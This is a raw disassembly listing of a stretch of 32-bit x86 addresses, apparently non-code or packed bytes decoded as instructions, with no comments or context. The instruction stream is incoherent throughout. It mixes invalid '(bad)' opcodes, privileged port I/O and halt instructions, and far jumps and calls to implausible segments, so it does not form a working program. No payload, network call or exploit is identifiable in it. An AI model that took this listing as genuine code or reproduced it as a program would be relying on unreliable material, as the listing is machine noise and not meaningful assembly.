  41094a:	lds    edi,FWORD PTR [ecx-0x2b797abb]
  410950:	mov    al,0x7c
  410952:	mov    ch,0xa7
  410954:	out    dx,eax
  410955:	popa   
  410956:	pop    es
  410957:	mov    edx,0xc80b613b
  41095c:	aad    0xce
  41095e:	xor    DWORD PTR [edx-0x369e08c9],esi
  410964:	xor    al,0x51
  410966:	fcmove st,st(0)
  410968:	cmc    
  410969:	ins    BYTE PTR es:[edi],dx
  41096a:	mov    BYTE PTR [ebx],ah
  41096c:	mov    esi,DWORD PTR [ebx-0xb9119cf]
  410972:	push   ds
  410973:	and    al,0x4a
  410975:	outs   dx,BYTE PTR ds:[esi]
  410976:	and    esp,ebx
  410978:	jae    0x4109b0
  41097a:	nop
  41097b:	out    dx,al
  41097c:	or     edx,eax
  41097e:	cld    
  41097f:	pop    ecx
  410980:	add    dh,dh
  410982:	fwait
  410983:	vhaddpd ymm3,ymm2,YMMWORD PTR gs:[edi-0x23d09c1a]
  41098c:	push   es
  41098d:	mov    eax,ds:0xd884e004
  410992:	(bad)  
  410993:	cwde   
  410994:	aaa    
  410995:	aas    
  410996:	leave  
  410997:	mov    eax,0x552171d2
  41099c:	jge    0x41094b
  41099e:	in     eax,0x97
  4109a0:	dec    esp
  4109a1:	dec    esp
  4109a2:	test   al,0x8b
  4109a4:	ror    BYTE PTR [edx-0x4a],1
  4109a7:	adc    ch,BYTE PTR ds:0x26dff9c2
  4109ad:	loopne 0x410949
  4109af:	dec    ebp
  4109b0:	mov    ah,0x4c
  4109b2:	xor    BYTE PTR [ebx+0x72],0xb
  4109b6:	dec    ecx
  4109b7:	popf   
  4109b8:	jp     0x410961
  4109ba:	data16 mov bl,0xaa
  4109bd:	ror    DWORD PTR [eax+0x1cdadbb0],1
  4109c3:	sub    edx,DWORD PTR ds:0xbd6dcdc7
  4109c9:	aad    0x6d
  4109cb:	mov    esi,0xdda9bcdf
  4109d0:	mov    ecx,0xff1ae4af
  4109d5:	mov    edi,0x8bb26887
  4109da:	inc    edx
  4109db:	push   ecx
  4109dc:	push   0x8dc0e8a7
  4109e1:	pushf  
  4109e2:	mov    ah,0x13
  4109e4:	pop    esi
  4109e5:	test   DWORD PTR [edx-0x18],0x523fddc6
  4109ec:	or     eax,0x5abbc181
  4109f1:	xchg   ebx,eax
  4109f2:	dec    eax
  4109f3:	aad    0xeb
  4109f5:	sub    al,0x2
  4109f7:	jle    0x4109f5
  4109f9:	out    dx,eax
  4109fa:	sub    eax,0x812980a0
  4109ff:	inc    esi
  410a00:	or     al,0x4f
  410a02:	push   cs
  410a03:	imul   eax,DWORD PTR [eax+0x42f3934],0xc1f9d5ad
  410a0d:	ja     0x410a5a
  410a0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a10:	and    DWORD PTR [edi],edi
  410a12:	dec    esp
  410a13:	adc    al,0x12
  410a15:	push   ss
  410a16:	add    BYTE PTR [eax],ch
  410a18:	pusha  
  410a19:	mov    BYTE PTR [esi+0x7ae9615c],0x9a
  410a20:	pop    esi
  410a21:	fiadd  DWORD PTR [edx]
  410a23:	pop    es
  410a24:	stc    
  410a25:	dec    edx
  410a26:	xlat   BYTE PTR ds:[ebx]
  410a27:	push   cs
  410a28:	jge    0x4109b8
  410a2a:	stos   BYTE PTR es:[edi],al
  410a2b:	ffreep st(0)
  410a2d:	cdq    
  410a2e:	pusha  
  410a2f:	sub    al,0x1b
  410a31:	pop    edi
  410a32:	call   0xe039:0xf61a90a4
  410a39:	(bad)  
  410a3a:	js     0x410a99
  410a3c:	xchg   DWORD PTR [ebx],ecx
  410a3e:	push   esp
  410a3f:	push   edi
  410a40:	idiv   BYTE PTR [eax-0x76]
  410a43:	jnp    0x410a75
  410a45:	es pop si
  410a48:	or     BYTE PTR [ebx+0x33],al
  410a4b:	fdivr  DWORD PTR [esi]
  410a4d:	enter  0x1f06,0xc
  410a51:	pop    esi
  410a52:	cmp    eax,0x2ecbe59b
  410a57:	pop    ds
  410a58:	push   ss
  410a59:	cmp    al,0xed
  410a5b:	cli    
  410a5c:	retf   
  410a5d:	pop    ebp
  410a5e:	adc    eax,DWORD PTR [eax+0x1b148c48]
  410a64:	push   ss
  410a65:	pop    ebx
  410a66:	stos   BYTE PTR es:[edi],al
  410a67:	gs ret 
  410a69:	mov    BYTE PTR [ebp-0x1d],cl
  410a6c:	pop    esi
  410a6d:	jg     0x410ade
  410a6f:	dec    eax
  410a70:	stc    
  410a71:	pop    ebp
  410a72:	adc    ebp,edi
  410a74:	xor    BYTE PTR [edi+0x57],ah
  410a77:	mov    dl,0x9a
  410a79:	jmp    0x410a35
  410a7b:	or     BYTE PTR [edx-0x1f8db13],ch
  410a81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a82:	idiv   BYTE PTR [edx]
  410a84:	imul   BYTE PTR [edi+0x19]
  410a87:	jecxz  0x410aa5
  410a89:	add    al,0x2
  410a8b:	sahf   
  410a8c:	sub    DWORD PTR [edi],ecx
  410a8e:	jne    0x410a5c
  410a90:	in     eax,0x96
  410a92:	fbld   TBYTE PTR [ecx+0x689615d3]
  410a98:	push   esp
  410a99:	in     eax,0x86
  410a9b:	sbb    eax,0xb817f520
  410aa0:	and    dh,dl
  410aa2:	fwait
  410aa3:	and    DWORD PTR [ebp+0x3ea04a83],esi
  410aa9:	mov    ds:0xc9826a83,al
  410aae:	pop    ecx
  410aaf:	jmp    0xc8ec:0x713fd4c4
  410ab6:	dec    esi
  410ab7:	das    
  410ab8:	xor    BYTE PTR [eax],dl
  410aba:	call   DWORD PTR ds:0x31315d17
  410ac0:	lahf   
  410ac1:	in     al,0x3a
  410ac3:	and    eax,0xfc4276b4
  410ac8:	dec    ebx
  410ac9:	sub    BYTE PTR [ecx-0x74],ch
  410acc:	ficomp DWORD PTR [ebx+0x7]
  410acf:	dec    esi
  410ad0:	fsubp  st(0),st
  410ad2:	inc    esi
  410ad3:	add    esi,DWORD PTR [edx-0xd8b8d88]
  410ad9:	sbb    esi,DWORD PTR [esi+0x25cb6875]
  410adf:	or     BYTE PTR [edx],ch
  410ae1:	mov    ah,0x71
  410ae3:	(bad)
  410ae6:	(bad)  
  410ae7:	push   ecx
  410ae8:	scas   al,BYTE PTR es:[edi]
  410ae9:	jle    0x410af4
  410aeb:	xor    edi,esi
  410aed:	push   ss
  410aee:	jbe    0x410ac6
  410af0:	jne    0x410b4b
  410af2:	arpl   WORD PTR [edi+esi*8],cx
  410af5:	mov    bl,0xc4
  410af7:	mov    eax,0x38c0d033
  410afc:	repnz push cs
  410afe:	addr16 pop edi
  410b00:	pop    esi
  410b01:	dec    edi
  410b02:	retf   0xec9b
  410b05:	fcmovnu st,st(6)
  410b07:	inc    ecx
  410b08:	sbb    al,0xfe
  410b0a:	push   0xffffff9e
  410b0c:	popf   
  410b0d:	mov    ecx,esi
  410b0f:	dec    edi
  410b10:	xchg   ecx,eax
  410b11:	push   ss
  410b12:	sub    eax,0x893ef60f
  410b17:	mov    DWORD PTR es:[esi+0x55],edx
  410b1b:	cmp    dl,BYTE PTR [eax+0x50]
  410b1e:	mov    edx,DWORD PTR [edi+edx*4+0xf52d152]
  410b25:	lock das 
  410b27:	fst    QWORD PTR [edi+ebp*8]
  410b2a:	or     DWORD PTR [eax+eiz*2-0x54],esi
  410b2e:	std    
  410b2f:	sbb    BYTE PTR [ebx-0x125d92b2],al
  410b35:	ret    
  410b36:	jno    0x410b93
  410b38:	jnp    0x410b61
  410b3a:	rcr    BYTE PTR [edx+0x1a953733],0xca
  410b41:	out    0x7e,al
  410b43:	loope  0x410ae2
  410b45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b46:	jmp    0x410b9f
  410b48:	xchg   DWORD PTR [ecx],edx
  410b4a:	add    cl,BYTE PTR [ecx-0x3da575f4]
  410b50:	imul   esp,edx,0xffffffc7
  410b53:	test   eax,0x4343ea83
  410b58:	jbe    0x410bc3
  410b5a:	test   eax,0x95831af6
  410b5f:	fidivr WORD PTR [edi]
  410b61:	adc    al,0x31
  410b63:	ins    BYTE PTR es:[edi],dx
  410b64:	pop    ebx
  410b65:	pop    es
  410b66:	div    DWORD PTR [ebx+0x29173abc]
  410b6c:	mov    es,WORD PTR [ebp+0x2c273945]
  410b72:	jae    0x410af6
  410b74:	aam    0x7b
  410b76:	xchg   edx,eax
  410b77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b78:	and    eax,0x2213aa7a
  410b7d:	pop    esp
  410b7e:	loope  0x410b94
  410b80:	inc    ebp
  410b81:	xor    al,0xa1
  410b83:	xchg   ebp,eax
  410b84:	adc    al,0xb4
  410b86:	cmp    DWORD PTR [ecx],ebp
  410b88:	in     eax,0x82
  410b8a:	dec    eax
  410b8b:	or     al,0x14
  410b8d:	shr    BYTE PTR [ebx+eax*2],1
  410b90:	mov    ch,0xd0
  410b92:	imul   ecx,DWORD PTR [edx+0x40],0x2fbecf3d
  410b99:	mov    edx,0xe6754d9f
  410b9e:	cmp    DWORD PTR [ebp+0x62],ebp
  410ba1:	test   al,0x36
  410ba3:	mov    edx,0x1d801114
  410ba8:	std    
  410ba9:	mov    dh,0x70
  410bab:	cmc    
  410bac:	fstp   QWORD PTR ds:0xe7301272
  410bb2:	inc    edx
  410bb3:	data16 std 
  410bb5:	repz cwde 
  410bb7:	scas   al,BYTE PTR es:[edi]
  410bb8:	adc    eax,0xd9501cae
  410bbd:	sar    DWORD PTR [eax],0x11
  410bc0:	jl     0x410bc9
  410bc2:	in     eax,dx
  410bc3:	mov    dh,0x6d
  410bc5:	jae    0x410be8
  410bc7:	jp     0x410bc5
  410bc9:	imul   ebp,DWORD PTR ds:0x4a3a1f35,0x73
  410bd0:	ret    0xfc15
  410bd3:	jmp    0x5126:0x3ee4f405
  410bda:	cmp    ebp,DWORD PTR [eax-0x62]
  410bdd:	pop    edi
  410bde:	pusha  
  410bdf:	mov    ebp,0x1515c624
  410be4:	and    DWORD PTR [ebp-0x7ded7686],edx
  410bea:	mov    eax,ds:0x81b39d5b
  410bef:	push   0xffffffb9
  410bf1:	mov    ebp,ds
  410bf3:	or     al,0xe9
  410bf5:	sub    eax,0xab17eae
  410bfa:	add    BYTE PTR [edi-0x11],dl
  410bfd:	enter  0xf393,0x5e
  410c01:	pmullw mm4,mm1
  410c04:	mov    dh,0xd1
  410c06:	lea    edx,[eax]
  410c08:	and    cl,0x22
  410c0b:	mov    cl,0xa7
  410c0d:	in     al,0xbe
  410c0f:	dec    esi
  410c10:	mov    dl,0x61
  410c12:	(bad)  
  410c13:	jmp    0x410be0
  410c15:	push   edx
  410c16:	vcvttsd2si eax,QWORD PTR [edi]
  410c1b:	sub    ecx,0x3
  410c1e:	xchg   BYTE PTR [edx+esi*1],bh
  410c21:	xor    ah,bh
  410c23:	jns    0x410c91
  410c25:	dec    eax
  410c26:	mov    dh,0xeb
  410c28:	rol    DWORD PTR [edx],cl
  410c2a:	pop    ss
  410c2b:	fdivr  DWORD PTR [esi]
  410c2d:	daa    
  410c2e:	dec    ebp
  410c2f:	or     BYTE PTR [ecx-0x5eae28f6],bh
  410c35:	mul    BYTE PTR [esi+0x39]
  410c38:	add    esi,DWORD PTR ds:0xcfc81f02
  410c3e:	sub    BYTE PTR [ecx-0x5a],al
  410c41:	(bad)
  410c45:	sub    ecx,0x4fafd0f8
  410c4b:	leave  
  410c4c:	mov    esi,ecx
  410c4e:	and    bl,BYTE PTR [esi]
  410c50:	daa    
  410c51:	mov    esi,0x67a003ee
  410c56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c57:	mov    eax,0x3b8f5612
  410c5c:	jl     0x410c53
  410c5e:	inc    ebx
  410c5f:	dec    DWORD PTR [edi+0x2a2f4901]
  410c65:	int    0x82
  410c67:	push   ecx
  410c68:	test   al,0x97
  410c6a:	add    esi,DWORD PTR [ebx-0x7d4b6f97]
  410c70:	lahf   
  410c71:	mov    bl,0x7c
  410c73:	rcl    BYTE PTR [edx+0x790a8d2c],cl
  410c79:	lds    edi,FWORD PTR [edx]
  410c7b:	ins    DWORD PTR es:[edi],dx
  410c7c:	jno    0x410cac
  410c7e:	inc    esp
  410c7f:	sbb    al,ch
  410c81:	fwait
  410c82:	cmp    al,0x87
  410c84:	(bad)  
  410c86:	sbb    dh,cl
  410c88:	sbb    eax,0xbd4fb645
  410c8d:	cli    
  410c8e:	lods   eax,DWORD PTR ds:[esi]
  410c8f:	scas   eax,DWORD PTR es:[edi]
  410c90:	push   esi
  410c91:	pop    esp
  410c92:	call   0xf30a:0xb098803b
  410c99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c9a:	inc    ecx
  410c9b:	mov    ecx,0x39fe6ea7
  410ca0:	inc    edx
  410ca1:	xchg   esi,eax
  410ca2:	retf   
  410ca3:	ret    0xba9
  410ca6:	cld    
  410ca7:	dec    eax
  410ca8:	mov    dl,0x8b
  410caa:	repz inc ebp
  410cac:	sub    BYTE PTR [ecx+0x4f],0x84
  410cb0:	bnd jge 0x410d03
  410cb3:	adc    BYTE PTR [ecx+0x5c656205],0xe7
  410cba:	ror    BYTE PTR [edx],0x26
  410cbd:	sbb    al,0x54
  410cbf:	or     dh,BYTE PTR [ebx+0x6]
  410cc2:	pop    edx
  410cc3:	bound  ecx,QWORD PTR [ebp-0x2b]
  410cc6:	and    al,BYTE PTR gs:[edi+eiz*4+0x4f35383f]
  410cce:	cmp    al,0x7
  410cd0:	pop    ds
  410cd1:	or     eax,0x8a3884da
  410cd6:	out    0x9a,eax
  410cd8:	pop    ecx
  410cd9:	mov    edi,0x2661f8be
  410cde:	sub    BYTE PTR [esi],al
  410ce0:	mov    ch,0xc4
  410ce2:	jle    0x410d12
  410ce4:	cs push 0x78
  410ce7:	inc    esp
  410ce8:	push   0x79285aec
  410ced:	mov    ah,0x5
  410cef:	mov    BYTE PTR [ebx-0x24c42c92],0x6e
  410cf6:	cmp    eax,0x66cc5827
  410cfb:	xor    dl,BYTE PTR [edx+0x99508d7]
  410d01:	pushf  
  410d02:	arpl   WORD PTR [esi-0x61239351],si
  410d08:	jge    0x410d4e
  410d0a:	adc    al,0x55
  410d0c:	out    dx,al
  410d0d:	in     al,dx
  410d0e:	mov    eax,0xecd70fa
  410d13:	clc    
  410d14:	lahf   
  410d15:	xor    BYTE PTR [ecx-0x71],bl
  410d18:	jae    0x410ce2
  410d1a:	shl    al,cl
  410d1c:	pop    es
  410d1d:	call   0xb2c6:0xcd28b1b7
  410d24:	adc    cl,BYTE PTR [edi]
  410d26:	enter  0xe65a,0xba
  410d2a:	popa   
  410d2b:	or     edi,eax
  410d2d:	fisubr DWORD PTR [ecx]
  410d2f:	out    0xee,al
  410d31:	adc    cl,BYTE PTR [edi+0xc5ae2ab]
  410d37:	rcr    BYTE PTR [eax-0x1d],0x81
  410d3b:	mov    WORD PTR [esi+0x41699cc5],ds
  410d41:	fcomp  QWORD PTR [edi+0x17443561]
  410d47:	dec    edx
  410d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d49:	push   eax
  410d4a:	cli    
  410d4b:	mov    DWORD PTR [esp+eiz*4+0x29],ebx
  410d4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d50:	cdq    
  410d51:	or     BYTE PTR [esi],dh
  410d53:	fsubp  st(7),st
  410d55:	mov    esi,0xab217013
  410d5a:	in     al,0xc8
  410d5c:	(bad)  [ebx+0x426f39f4]
  410d62:	cmp    ah,BYTE PTR [ebx]
  410d64:	xlat   BYTE PTR ds:[ebx]
  410d65:	shr    DWORD PTR [eax-0x63],cl
  410d68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d69:	jns    0x410d59
  410d6b:	fnstenv [edx-0x7b51e812]
  410d71:	xor    DWORD PTR [edi-0x35],ebp
  410d74:	fidivr WORD PTR [eax-0x5a34ff48]
  410d7a:	cmp    BYTE PTR [eax+0x597ad21b],dh
  410d80:	inc    esi
  410d81:	jge    0x410d9a
  410d83:	ror    eax,0x3b
  410d86:	cmp    dl,cl
  410d88:	jne    0x410e09
  410d8a:	in     eax,dx
  410d8b:	dec    esp
  410d8c:	out    0x2f,eax
  410d8e:	jno    0x410d91
  410d90:	loopne 0x410df1
  410d92:	mov    al,0xa
  410d94:	mov    bh,0x75
  410d96:	jge    0xaf9a9352
  410d9c:	mov    ecx,0x7cba8633
  410da1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410da2:	sahf   
  410da3:	sub    esp,DWORD PTR [ecx-0x58]
  410da6:	pushf  
  410da7:	lahf   
  410da8:	xlat   BYTE PTR ds:[ebx]
  410da9:	(bad)  
  410daa:	pop    ss
  410dab:	dec    esp
  410dac:	xor    eax,0x2f859026
  410db1:	(bad)  
  410db2:	leave  
  410db3:	sbb    eax,0x79a5bd86
  410db8:	hlt    
  410db9:	jmp    0xfc088740
  410dbe:	(bad)  
  410dbf:	aaa    
  410dc0:	(bad)  
  410dc1:	cmc    
  410dc2:	test   BYTE PTR [eax-0x75],ah
  410dc5:	and    dh,al
  410dc7:	loop   0x410dbd
  410dc9:	outs   dx,DWORD PTR ds:[esi]
  410dca:	das    
  410dcb:	xor    ecx,DWORD PTR [ecx-0x3b]
  410dce:	and    al,0xc7
  410dd0:	sbb    eax,0x442b8d09
  410dd5:	cmp    al,al
  410dd7:	and    DWORD PTR [esi-0x30ecf6b2],0x72e63145
  410de1:	pop    ecx
  410de2:	inc    ebx
  410de3:	dec    edx
  410de4:	(bad)  
  410de5:	pop    ds
  410de6:	cmp    BYTE PTR [edx+0x2cc69c3],bh
  410dec:	test   DWORD PTR [edi+ebp*4],ebx
  410def:	mov    esi,ebx
  410df1:	repz fld TBYTE PTR [edx+0x38]
  410df5:	shl    esp,cl
  410df7:	inc    ebp
  410df8:	pop    ecx
  410df9:	mov    al,0x8d
  410dfb:	inc    edx
  410dfc:	js     0x410e6f
  410dfe:	icebp  
  410dff:	pop    ss
  410e00:	dec    ecx
  410e01:	stc    
  410e02:	add    BYTE PTR [esi],dl
  410e04:	cmp    ecx,DWORD PTR [ebx+edi*1+0x76]
  410e08:	pop    ebp
  410e09:	rol    DWORD PTR [ebp+edx*8-0x36],0xe9
  410e0e:	aas    
  410e0f:	pop    ebp
  410e10:	xchg   esi,eax
  410e11:	sub    eax,0x5bdaf3f5
  410e16:	in     al,dx
  410e17:	iret   
  410e18:	stc    
  410e19:	test   al,0xb6
  410e1b:	sub    eax,0x5bdd290f
  410e20:	out    dx,eax
  410e21:	xor    ebx,esi
  410e23:	jle    0x410dd4
  410e25:	pop    esp
  410e26:	sbb    al,0xf1
  410e28:	adc    DWORD PTR [ebx],ebx
  410e2a:	js     0x410e50
  410e2c:	jbe    0x410e67
  410e2e:	into   
  410e2f:	jmp    0x98cb34ba
  410e34:	adc    ecx,DWORD PTR ds:0x7cf8e8ef
  410e3a:	mov    edi,0xf0a22fd
  410e3f:	jo     0x410dc9
  410e41:	in     al,dx
  410e42:	repz rcr DWORD PTR [ebx+0x7],cl
  410e46:	aaa    
  410e47:	enter  0x3e86,0xac
  410e4b:	dec    esi
  410e4c:	ss push edi
  410e4e:	xor    bh,BYTE PTR [edi+esi*1+0x61]
  410e52:	cmc    
  410e53:	pop    esp
  410e54:	pusha  
  410e55:	xchg   esp,eax
  410e56:	mov    ds:0x81dccb82,al
  410e5b:	mov    edi,0x6ab25ac5
  410e60:	fbld   TBYTE PTR [eax+0xb28feaa]
  410e66:	idiv   bl
  410e68:	cdq    
  410e69:	int    0x3e
  410e6b:	mov    ecx,0x40c9c76b
  410e70:	popf   
  410e71:	movntps XMMWORD PTR [edi+0x7],xmm5
  410e75:	in     al,0x9d
  410e77:	xchg   DWORD PTR ds:0x73db23d3,esi
  410e7d:	pop    es
  410e7e:	int3   
  410e7f:	mov    ecx,0x2a5659f1
  410e84:	les    esi,FWORD PTR ds:0xaea31ecd
  410e8a:	sbb    al,0x78
  410e8c:	mov    ds:0x37d106bf,al
  410e91:	inc    ebp
  410e92:	dec    edi
  410e93:	fdiv   QWORD PTR [esi+edi*4]
  410e96:	aaa    
  410e97:	pop    eax
  410e98:	dec    eax
  410e99:	xchg   edx,eax
  410e9a:	sub    eax,0x9ed5863c
  410e9f:	out    0xd8,al
  410ea1:	pop    ecx
  410ea2:	pop    edi
  410ea3:	enter  0x6454,0xf6
  410ea7:	jae    0x410f02
  410ea9:	adc    BYTE PTR [ebx-0x2e],0x60
  410ead:	inc    edi
  410eae:	or     al,0xa5
  410eb0:	adc    esp,DWORD PTR [edx]
  410eb2:	jnp    0x410e8d
  410eb4:	test   eax,0x5f843e11
  410eb9:	out    0x13,eax
  410ebb:	jg     0x410e7e
  410ebd:	jb     0x410e83
  410ebf:	or     ah,0x42
  410ec2:	xchg   ebp,eax
  410ec3:	hlt    
  410ec4:	inc    ebx
  410ec5:	mov    dh,0x24
  410ec7:	mov    edi,0x777ec53d
  410ecc:	cwde   
  410ecd:	loope  0x410f08
  410ecf:	mov    edx,0x6af5a5fe
  410ed4:	and    BYTE PTR [edi+0x9],dl
  410ed7:	xchg   ecx,eax
  410ed8:	fiadd  DWORD PTR [ebx-0x74]
  410edb:	imul   ebp,DWORD PTR [eax-0x4cd73122],0xc18596d1
  410ee5:	and    edx,DWORD PTR [ebx]
  410ee7:	mov    dl,0x1c
  410ee9:	or     ecx,ebx
  410eeb:	mov    cl,0x90
  410eed:	ja     0x410f54
  410eef:	mov    edx,0xc4994f6d
  410ef4:	push   esi
  410ef5:	jne    0x410ebf
  410ef7:	clc    
  410ef8:	inc    eax
  410ef9:	push   cs
  410efa:	push   ss
  410efb:	and    DWORD PTR [ebx],0x5d
  410efe:	dec    esi
  410eff:	call   0x8a884260
  410f04:	repz inc ebp
  410f06:	ror    BYTE PTR [edi+0x7fff861c],1
  410f0c:	pushf  
  410f0d:	and    eax,0x50b0cd50
  410f12:	in     eax,0xfe
  410f14:	stos   DWORD PTR es:[edi],eax
  410f15:	icebp  
  410f16:	add    ecx,ecx
  410f18:	add    eax,0x75e2376
  410f1d:	loopne 0x410f9a
  410f1f:	pop    ebx
  410f20:	inc    edi
  410f21:	lds    eax,FWORD PTR [edx]
  410f23:	push   ds
  410f24:	fstp   TBYTE PTR [ecx]
  410f26:	fwait
  410f27:	ror    DWORD PTR [ebp+0x78e78474],cl
  410f2d:	outs   dx,BYTE PTR ds:[esi]
  410f2e:	pop    ecx
  410f2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f30:	sub    cl,BYTE PTR [edi]
  410f32:	and    DWORD PTR [ebx],eax
  410f34:	int3   
  410f35:	pop    ebp
  410f36:	shr    DWORD PTR [edx],cl
  410f38:	dec    esp
  410f39:	sub    BYTE PTR [edx-0x8],bl
  410f3c:	mov    dl,0xb3
  410f3e:	and    BYTE PTR [esi],bh
  410f40:	call   0xc8b85c7a
  410f45:	add    eax,DWORD PTR [ebx-0x5d6f120f]
  410f4b:	pop    esp
  410f4c:	out    dx,eax
  410f4d:	jae    0x410fa0
  410f4f:	jmp    0x2d2f81eb
  410f54:	push   ebx
  410f55:	push   ss
  410f56:	js     0x410efe
  410f58:	jne    0x410f60
  410f5a:	gs (bad) 
  410f5d:	dec    edx
  410f5e:	add    al,BYTE PTR [ebx]
  410f60:	mov    ecx,0xc6016bf1
  410f65:	not    BYTE PTR [edi+edx*8-0x64]
  410f69:	inc    esi
  410f6a:	pop    esi
  410f6b:	loop   0x410fbb
  410f6d:	cmp    al,0x3b
  410f6f:	mov    al,0x7b
  410f71:	push   edi
  410f72:	xchg   esi,eax
  410f73:	push   edx
  410f74:	adc    al,0x60
  410f76:	xchg   edx,eax
  410f77:	daa    
  410f78:	jmp    0x8c598306
  410f7d:	mov    dl,0xb2
  410f7f:	fld    QWORD PTR [esi+0x65]
  410f82:	adc    DWORD PTR [esi-0x20],eax
  410f85:	stc    
  410f86:	in     al,0xc4
  410f88:	sbb    DWORD PTR [ebp-0x73addd55],ebx
  410f8e:	xchg   DWORD PTR [edx],eax
  410f90:	or     ebx,DWORD PTR [ecx-0x5d09afe5]
  410f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f97:	pop    esp
  410f98:	hlt    
  410f99:	clc    
  410f9a:	mov    ah,BYTE PTR [edx+0x63f5fc91]
  410fa0:	jl     0x411002
  410fa2:	or     edi,DWORD PTR [edx+0x39]
  410fa5:	out    0x2d,al
  410fa7:	inc    edi
  410fa8:	loopne 0x410f7f
  410faa:	mov    ebp,0x4e0f95b4
  410faf:	(bad)  
  410fb0:	enter  0x4ace,0x52
  410fb4:	cmc    
  410fb5:	jp     0x410fd9
  410fb7:	dec    ebx
  410fb8:	lods   eax,DWORD PTR ds:[esi]
  410fb9:	and    al,0xb
  410fbb:	loopne 0x410f69
  410fbd:	sub    DWORD PTR [ebx],eax
  410fbf:	adc    eax,0x196563ed
  410fc4:	push   ds
  410fc5:	mov    cl,0xee
  410fc7:	adc    dh,dl
  410fc9:	cmc    
  410fca:	(bad)  
  410fcb:	sahf   
  410fcc:	add    al,0x5b
  410fce:	xchg   esp,eax
  410fcf:	lods   eax,DWORD PTR ds:[esi]
  410fd0:	dec    eax
  410fd1:	push   cs
  410fd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fd3:	adc    dh,BYTE PTR [ebp+0x78]
  410fd6:	sti    
  410fd7:	mov    al,0x69
  410fd9:	push   esi
  410fda:	jecxz  0x410f84
  410fdc:	xor    al,0x8b
  410fde:	stos   BYTE PTR es:[edi],al
  410fdf:	fisttp WORD PTR [eax+0x65926252]
  410fe5:	mov    dl,BYTE PTR [edi-0x71]
  410fe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fe9:	mov    ch,0x74
  410feb:	ins    BYTE PTR es:[edi],dx
  410fec:	popa   
  410fed:	in     al,dx
  410fee:	lods   eax,DWORD PTR ds:[esi]
  410fef:	jmp    0x41101b
  410ff1:	adc    al,0xee
  410ff3:	mov    al,0x95
  410ff5:	inc    edi
  410ff6:	jmp    0xc9ab2cd9
  410ffb:	push   ds
  410ffc:	retf   
  410ffd:	stos   DWORD PTR es:[edi],eax
  410ffe:	clc    
  410fff:	les    edx,FWORD PTR [edi]
  411001:	popa   
  411002:	xchg   ebx,eax
  411003:	jmp    0x410fc3
  411005:	test   eax,0xcbeaa04e
  41100a:	xor    BYTE PTR ds:0xcb2f7a91,bh
  411010:	mov    al,0x4b
  411012:	shl    BYTE PTR [esi+0x59],cl
  411015:	aaa    
  411016:	fidiv  DWORD PTR [esi]
  411018:	lds    edi,FWORD PTR [ebp-0x7e]
  41101b:	mov    DWORD PTR ds:0xa25c4024,edi
  411021:	push   es
  411022:	xchg   ebx,eax
  411023:	repnz xor DWORD PTR [ecx-0x1ed2ed48],esi
  41102a:	jne    0x411079
  41102c:	cmc    
  41102d:	push   0x7d
  41102f:	adc    DWORD PTR [edi+0x71],esi
  411032:	sbb    edi,DWORD PTR [eax]
  411034:	and    dh,BYTE PTR [esi]
  411036:	pop    esp
  411037:	int3   
  411038:	sar    BYTE PTR [edx],1
  41103a:	inc    edx
  41103b:	cdq    
  41103c:	jae    0x41109f
  41103e:	dec    eax
  41103f:	dec    edi
  411040:	gs test eax,0x8d80f496
  411046:	into   
  411047:	or     eax,0xaa192bbe
  41104c:	xor    al,0x8a
  41104e:	cwde   
  41104f:	xchg   BYTE PTR [edx+0x215ea8a2],cl
  411055:	jno    0x411078
  411057:	ror    BYTE PTR [bp+si-0x68],cl
  41105b:	stc    
  41105c:	iret   
  41105d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41105e:	retf   
  41105f:	ds dec edi
  411061:	inc    esi
  411062:	push   esp
  411063:	es cwde 
  411065:	mov    ds:0x192d4fd,al
  41106a:	inc    esi
  41106b:	(bad)  
  41106c:	rol    BYTE PTR [ebx],cl
  41106e:	mov    DWORD PTR [edx],edx
  411070:	cmp    eax,0x61039316
  411075:	pop    eax
  411076:	aad    0x7e
  411078:	xor    DWORD PTR [ecx+0x1305ad8b],ecx
  41107e:	test   DWORD PTR [ecx+0x62],esp
  411081:	mov    esp,0x4fc58c97
  411086:	adc    eax,0xe1492b97
  41108b:	mov    bl,0x2a
  41108d:	adc    bh,BYTE PTR [esi]
  41108f:	inc    edi
  411090:	out    dx,eax
  411091:	push   ecx
  411092:	or     BYTE PTR [ebp+0x9d94f03],ch
  411098:	push   esp
  411099:	jmp    0xffa3:0x913ee17e
  4110a0:	sub    DWORD PTR [ebp+0x341ce986],ebx
  4110a6:	popa   
  4110a7:	(bad)  
  4110a8:	nop
  4110a9:	das    
  4110aa:	stos   BYTE PTR es:[edi],al
  4110ab:	add    ecx,DWORD PTR [eax]
  4110ad:	sub    ah,BYTE PTR ds:0x7b6ed533
  4110b3:	div    BYTE PTR [ecx+edi*4]
  4110b6:	loop   0x411051
  4110b8:	add    ah,ch
  4110ba:	ins    DWORD PTR es:[edi],dx
  4110bb:	mov    WORD PTR [esi+edi*2],cs
  4110be:	dec    edx
  4110bf:	call   0x3083:0x3421ab85
  4110c6:	bound  edi,QWORD PTR [edx-0x1387aebf]
  4110cc:	xchg   DWORD PTR [ebx+0x4ee3e57d],esp
  4110d2:	rcl    BYTE PTR [edx],cl
  4110d4:	mov    bl,0x33
  4110d6:	mov    dl,0x48
  4110d8:	adc    BYTE PTR [ebp-0x2c3befc4],0xfd
  4110df:	xchg   edx,eax
  4110e0:	sbb    al,0x52
  4110e2:	test   BYTE PTR [ebx+edx*8-0x5f6ed067],ah
  4110e9:	push   ss
  4110ea:	mov    ds:0xcc89e222,eax
  4110ef:	(bad)  
  4110f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
